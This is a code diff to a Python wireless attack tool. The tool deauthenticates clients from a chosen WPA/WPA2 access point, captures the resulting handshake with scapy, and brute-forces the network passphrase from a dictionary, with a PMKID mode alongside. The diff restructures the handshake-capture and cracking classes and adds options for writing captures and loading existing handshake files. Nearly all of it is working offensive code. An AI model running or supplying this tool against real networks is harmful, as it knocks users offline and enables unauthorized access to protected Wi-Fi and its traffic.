@@ -15,7 +15,7 @@ import random
 import exceptions
 from pull import Pully
 from screen import Display
-from signal import signal, SIGINT
+from signal import signal, SIGINT, getsignal
 from wireless import Shifter
 from wireless import Sniper
 from wireless import PSK
@@ -25,12 +25,14 @@ from scapy.utils import rdpcap
 from scapy.utils import PcapWriter
 from utils import tabulate
 from utils import org
+from utils import Modes
 
-WRITE__ = True
+WRITE__ = ''
 DICTIONARY = ''
-NEW_HAND = False
 V__ = bool(0)
 _KEY_ = None
+_HANDLER = getsignal(SIGINT)
+_HANDSHAKE = ''
 
 class interface:
 
@@ -191,147 +193,6 @@ class Sniffer:
 		print "\n"+tabulate(tabulator__, headers=__HEADERS)+"\n"
 		os.kill(os.getpid(), SIGINT)
 
-class Phazer:
-
-	def __init__(self, sniffer):
-		self.iface = sniffer.iface1
-		self.WiFiAP = sniffer.WiFiAP
-
-	def count_input(self):
-		while True:
-			try:
-				count = pull.question('Enter Your Target Number [q]uit/[n]: ')
-				return count
-			except:
-				pass
-
-	def get_input(self):
-		while True:
-			count = self.count_input()
-			if count == 'q' or count == 'Q':
-				sys.exit(0)
-			for AP in self.WiFiAP:
-				if str(AP['count']) == count:
-					return AP
-
-	def call_PSK(self, eapol, essid, enc):
-		self.psk = PSK(eapol, essid, enc, DICTIONARY, V__, _KEY_)
-		pass__, _PMK_, _KCK_, _MIC_ = self.psk.broot()
-
-		if pass__:
-			pull.use('Found: %s' % pass__)
-
-			if V__:
-				pull.right('PMK: ')
-				print _PMK_
-				pull.right('PTK: ')
-				print _KCK_
-				pull.right('MIC: ')
-				print _MIC_
-
-			return True
-		else:
-			pull.error("Sorry, but the Password is not in the dictionary. Try enlarging it. ")
-			return False
-
-	def discard_p_hand(self, bss):
-		f_name = 'handshakes'
-		filename = bss.replace(':', '').lower()
-		if os.path.isfile(os.path.join(os.getcwd(), f_name, '%s.cap' % filename)):
-			os.remove(os.path.join(os.getcwd(), f_name, '%s.cap' % filename))
-			return 1
-		else:
-			return 0
-
-	def verify_h_crack(self, bss):
-		f_name = 'handshakes'
-		tgt__ = bss.replace(':', '').lower()
-
-		self.c_v_path(os.path.join(os.getcwd(), f_name))
-		
-		if not os.path.isfile(os.path.join(os.getcwd(), f_name, '%s.cap' % (tgt__))):
-			return (False, None)
-		else:
-			return (True, os.path.join(os.getcwd(), f_name, '%s.cap' % (tgt__)))
-
-	def h_crack(self, ap, p_to_h):
-		if V__:
-			pull.up('Reading Packets from Captured File: %s'\
-						 % p_to_h)
-		pkts = rdpcap(p_to_h)
-		gen = eAPoL(ap['bssid'])
-		for pkt in pkts:
-			comp__ = gen.check(pkt)
-			if comp__:
-				if V__:
-					pull.info('Valid Handshake Found. Manipulaing Data ...')
-					pull.right('AP Manufacturer: %s' % (org(ap['bssid']).org))
-				break
-		pols = gen.get_pols()
-		self.call_PSK(pols, ap['essid'], ap['auth'])
-
-	def d_h_crack(self, ap, timeout, deauth):
-		global WRITE__
-
-		y_h = False
-
-		while not y_h:
-
-			pull.up('Locating Clients from AP to generate handshake. Sleeping for %d Seconds. ' % timeout)
-			self.sniper = Sniper(self.iface, ap['bssid'], ap['essid'], ap['channel'], timeout)
-			self.sniper.cl_generator()
-			cls__ = self.sniper.clients()
-			pull.info('Clients Detected. Number of Connected Users: %d' % len(cls__))
-
-			if cls__:
-				for tup in cls__:
-					if V__:
-						pull.up('Attempting to Dissociate %s from AP. Detected Range: %d'\
-								 % (pull.RED+tup[0].upper()+pull.END, tup[1] if tup[1] != -999 else -1))
-					else:
-						pull.up('Attempting to Dissociate %s from Access Point.'\
-									 % (pull.RED+tup[0].upper()+pull.END))
-					pkts__ = self.sniper.shoot(tup[0], deauth)
-					if V__:
-						pull.up('Checking For Valid Handshake b/w "%s" and "%s"'\
-									 % (pull.BOLD+ap['essid']+pull.END, pull.BOLD+tup[0].upper()+pull.END))
-					if pkts__[0]:
-						y_h = not False
-						if V__:
-							pull.use('Handshake SucessFull. MAC: %s' % tup[0].upper())
-							pull.right('Vendor (AP): %s Vendor (Client): %s'\
-										 % (org(ap['bssid']).org, org(tup[0]).org) )
-						else:
-							pull.use('Handshake Got Successful. Attempting to Save it. ')
-						if WRITE__:
-							h_path = self.save_handshake(pkts__[1], ap['bssid'])
-							if V__:
-								pull.info('Saved handshake in %s' % h_path)
-						if self.call_PSK(pkts__[1], ap['essid'], ap['auth']):
-							sys.exit(0)
-					else:
-						pull.error('No Handshake Found. Skippingg to Next Client ...')
-						time.sleep(2)
-			else:
-				pull.error('Sorry, but shutting Down. No connected users found in the target network.')
-				sys.exit(0)
-
-	def save_handshake(self, pkts, bss):
-		f_name = 'handshakes'
-		fi_name = '%s.cap' % (bss.replace(':', '').lower())
-
-		self.c_v_path(os.path.join(os.getcwd(), f_name))
-		
-		file__ = PcapWriter(os.path.join(os.getcwd(), f_name, fi_name), append=True, sync=True)
-		for pkt in pkts:
-			file__.write(pkt)
-		file__.close()
-		return os.path.join(os.getcwd(), f_name, fi_name)
-
-	def c_v_path(self, directory):
-		if not os.path.exists(directory):
-			os.makedirs(directory)
-
 class pmkid_GEN:
 
 	def __init__(self, iface_instance, ap_instance, no_frames):
@@ -378,28 +239,155 @@ class pmkid_GEN:
 		self.iface_instance.put_channel(_ch)
 		return _ch
 
+class Phazer:
+
+	THEPOL = ()
+
+	def __init__(self, sniffer):
+		self.iface = sniffer.iface1
+		self.WiFiAP = sniffer.WiFiAP
+
+	def count_input(self):
+		while True:
+			try:
+				count = pull.question('Enter Your Target Number [q]uit/[n]: ')
+				return count
+			except:
+				pass
+
+	def get_input(self):
+		while True:
+			count = self.count_input()
+			if count == 'q' or count == 'Q':
+				sys.exit(0)
+			for AP in self.WiFiAP:
+				if str(AP['count']) == count:
+					return AP
+
+	def clients_sniff(self, _bss, _ess, _ch, _tm):
+		_clip = Sniper(self.iface, _bss, _ess, _ch, _tm, pull, V__)
+		pull.info("Scanning for Access Point Stations. Press [CTRL+C] to Stop.")
+		signal(SIGINT, _HANDLER)
+		_clip.cl_generator()
+		signal(SIGINT, grace_exit)
+		return _clip.clients()
+
+	def save(self):
+		global WRITE__
+		
+		if WRITE__:
+			_wr = PcapWriter(WRITE__, append=False, sync=True)
+			_wr.write(self.THEPOL)
+			pull.use("Handshake >> [%s] Count [%s] %s[Saved]%s" % (pull.DARKCYAN+WRITE__+pull.END, str(len(self.THEPOL)), pull.GREEN, pull.END ))
+		else:
+			pull.error("Handshake not saved. Use -w, --write for saving handshakes. ")
+
+	def crack_shoot(self, _tgt, _hd=False):
+		if not _hd:
+			self.save()
+
+		_crk = PSK(self.THEPOL, _tgt['essid'], _tgt['auth'], DICTIONARY, V__, _KEY_)
+		_pass, _pmk, _ptk, _mic = _crk.broot()
+
+		if _pass:
+			pull.use("Found: %s" % (_pass))
+			pull.right("PMK: "); print _pmk
+			pull.right("PTK: "); print _ptk
+			pull.right("MIC: "); print _mic
+
+		else:
+			pull.error("Password not Found! Try enlarging your dictionary!")
+			sys.exit(0)
+
+		return 
+
+	def sniper_shoot(self, _bss, _ess, _ch, _clients, _tm, _deauth):
+		pull.info("Time Interval [%s] -> Implies Gap b/w Frames is %d" % (pull.DARKCYAN+str(_tm)+pull.END, _tm))
+		_snip = Sniper(self.iface, _bss, _ess, _ch, _tm, pull, V__)
+		for _ap, _cls in _clients.items():
+			if _ap == _bss:
+				while not len(self.THEPOL) >= 4:
+					for _cl, _pwr in _cls:
+						if V__:
+							pull.up("%i-> %s (%s) %s><%s %s (%s) %s[Deauthentication]%s" % (_deauth, _cl.replace(':', '').upper(), pull.DARKCYAN+org(_cl).org+pull.END,\
+									pull.RED, pull.END, _bss.replace(':', '').upper(), pull.DARKCYAN+org(_bss).org+pull.END, pull.RED, pull.END))
+						else:
+							pull.up("%i-> %s %s><%s %s %s[Deauthentication]%s" % (_deauth, _cl.replace(':', '').upper(),\
+									pull.RED, pull.END, _bss.replace(':', '').upper(), pull.RED, pull.END))
+						_sht = threading.Thread(target=_snip.shoot, args=(_cl, _deauth, self), name="T Shooter")
+						_sht.daemon = True
+						_sht.start();
+					time.sleep(_tm)
+				pull.use("Handshake %s (%s) %s[Captured]%s" % (_bss.replace(':', '').upper(), pull.DARKCYAN+org(_bss).org+pull.END, \
+																pull.GREEN, pull.END)); break
+
+class Moder:
+
+	def __init__(self, _n, _sniff, _int):
+		self.mode = _n
+		self.interface_inst = _int
+		self._sniff = _sniff
+
+	def hand_mode_ext(self, _tgt, _ph):
+		_eap = eAPoL(_tgt['bssid'])
+		_pkts = rdpcap(_HANDSHAKE); _valid = False
+
+		for pkt in _pkts:
+			_yorn = _eap.check(pkt)
+			if _yorn:
+				_valid = True; break
+
+		if _valid:
+			_ph.THEPOL = _eap.get_pols()
+			_ph.crack_shoot(_tgt, True)
+		else:
+			self.pull.error("Handshake not Found. Please provide a valid handshake!")
+
+
+	def hand_mode(self, _ph ,_tgt, _tm, _deauth):
+		if 'WPA' in _tgt['auth']:
+			self.interface_inst.stop_hopper = 1; time.sleep(1)
+			self.interface_inst.put_channel(_tgt['channel'])
+			if not _HANDSHAKE:
+				pull.info("Changing Channel to %s %s[SuccessFul]%s" % (_tgt['channel'], pull.GREEN, pull.END))
+				_cls = self._sniff.shift._Shifter__ALSA_CLIENTS
+				_yorn = pull.question("AP Clients %s[%s]%s Scan Further?[Y/n] " % (pull.YELLOW, _tgt['clients'], pull.END))
+				if _yorn == 'y' or _yorn == 'Y':
+					_cls = _ph.clients_sniff(_tgt['bssid'], _tgt['essid'], _tgt['channel'], _tm)
+				if len(_cls) >= 1:
+					_ph.sniper_shoot(_tgt['bssid'], _tgt['essid'], _tgt['channel'], _cls, _tm, _deauth)
+					_ph.crack_shoot(_tgt)
+				else:
+					pull.special("Found Clients [0]. Shutting Down!")
+					sys.exit(1)
+			else:
+				self.hand_mode_ext(_tgt, _ph)
+		else:
+			pull.special("The specified mode can only be used for WPA/WPA2 Networks")
+			sys.exit(-1)
+
 def grace_exit(sig, frame):
 	pull.special("Closing. Cleaning up the mess! ")
-	time.sleep(2)
+	time.sleep(1)
 	sys.exit(0)
 
 def main():
-	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_
+	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_, _HANDSHAKE
 
 	parser = optparse.OptionParser(add_help_option=False)
 	parser.add_option('-h', '--help', dest='help', default=False, action="store_true", help="Show this help manual")
-	parser.add_option('-m', '--mode', dest='mode', type='int', default=1, help="Mode to Use. ")
+	parser.add_option('-m', '--mode', dest='mode', type='int', help="Mode to Use. ")
 	parser.add_option('-i', '--interface', dest="interface", type='string', help="Monitor Wireless Interface to use")
 	parser.add_option('-e', '--essid', dest="essid", type='string', help="Targets AP's with the specified ESSIDs")
 	parser.add_option('-b', '--bssid', dest="bssid", type='string', help="Targets AP's with the specified BSSIDs")
 	parser.add_option('-c', '--channel', dest="channel", type='int', help="Listen on specified channel.")
 	parser.add_option('-p', '--passwords', dest="password", type='string', help="Check the AP against provided WPA Key Passphrases, seperated by comma.")
 	parser.add_option('-d', '--dictionary', dest='dictionary', type='string', help="Dictionary containing Passwords")
-	parser.add_option('', '--newhandshake', dest='newhandshake', default=False, action="store_true", help="Discard previous handshake and capture new one. ")
-	parser.add_option('', '--nowrite', dest="write", default=True, action="store_false", help="Do not Save the Captured Handshakes")
-	parser.add_option('', '--deauth', dest='deauth', type='int', default=32, help="Deauth Packets to send. ")
+	parser.add_option('-w', '--write', dest='write', type='string', help="Write Data to a file. ")
+	parser.add_option('--handshake', dest='handshake',type='string', help='Handshake to use, instead of dissociating')
+	parser.add_option('', '--deauth', dest='deauth', type='int', default=32, help="Deauth Packets to send.")
 	parser.add_option('', '--frames', dest='frames', type='int', default=0, help="Number of Auth and Association Frames")
-	parser.add_option('-t', '--timeout', dest="timeout", default=20, type='int', help="Specify timeout for locating target clients. ")
+	parser.add_option('-t', '--timeout', dest="timeout", default=15, type='int', help="Specify timeout for locating target clients. ")
 	parser.add_option('-v', '--verbose', dest="verbose", default=False, action="store_true", help="Print hashes and verbose messages. ")
 	
 	(options, args) = parser.parse_args()
@@ -409,10 +397,25 @@ def main():
 		sys.exit(0)
 
 	if options.password != None:
-		_KEY_ = options.password	
+		_KEY_ = options.password
 
-	if options.write == False:
-		WRITE__ = not True
+	if not Modes().get_mode(options.mode):
+		pull.special("No Mode Specified! Please supply -m, --mode option.")
+		sys.exit(-1)
+
+	if options.write != None:
+		if os.path.isfile(options.write):
+			pull.special("File Already Exists! %s[%s]%s" % (pull.RED, options.write, pull.END))
+			sys.exit(-1)
+		else:
+			WRITE__ = options.write
+
+	if options.handshake != None:
+		if os.path.isfile(options.handshake):
+			_HANDSHAKE = options.handshake
+		else:
+			pull.error("No such File %s[%s]%s" % (pull.RED, options.handshake, pull.END))
+			sys.exit(-1)
 
 	if options.dictionary == None:
 		pull.error("No dictionary was provided. Use -h or --help for more information. ")
@@ -425,9 +428,6 @@ def main():
 		else:
 			pull.error('No such File: %s' % (options.dictionary))
 			sys.exit(-1)
-
-	if options.newhandshake == True:
-		NEW_HAND = not False
 
 	if options.verbose == True:
 		V__ = bool(1)
@@ -463,23 +463,10 @@ def main():
 		sniffer = Sniffer(iface)
 
 	if options.mode == 1:
-		phaser = Phazer(sniffer)
-		target = phaser.get_input()
-		signal(SIGINT, grace_exit)
-		pull.info("Choosed Target: \n")
-		print tabulate([[target['essid'], target['bssid'].upper(), org(target['bssid']).org, str(target['channel']), target['auth']]],\
-					 headers=[pull.BOLD+'NAME', 'BSSID', 'VENDOR', 'CH', 'ENC'+pull.END]) + "\n"
-		if not phaser.verify_h_crack(target['bssid'])[0] or NEW_HAND == True:
-			if NEW_HAND:
-				d_carded__ = phaser.discard_p_hand(target['bssid'])
-				if d_carded__:
-					pull.delete('Discarded Previous Handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
-				else:
-					pull.info('Attempting to Capture new handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
-			phaser.d_h_crack(target, int(options.timeout), options.deauth)
-		else:
-			pull.use("We've already got the handshake for this network. Attempting to Crack it.")
-			phaser.h_crack(target, phaser.verify_h_crack(target['bssid'])[1])
+		phaser = Phazer(sniffer); _tgt = phaser.get_input(); signal(SIGINT, grace_exit)
+		_modler = Moder(options.mode, sniffer, iface)
+		_modler.hand_mode(phaser, _tgt, options.timeout, options.deauth)
+
 	elif options.mode == 2:
 		pmk = pmkid_GEN(iface, Phazer(sniffer).get_input(), options.frames)
 		signal(SIGINT, grace_exit)
@@ -488,7 +475,7 @@ def main():
 				if pmk.asso_gen():
 					pmk.lets_crack()
 		else:
-			pull.special("This attach vector only works for WPA2 networks")
+			pull.special("This attack only works for WPA2 networks")
 			sys.exit(0)
 
 if __name__ == "__main__":
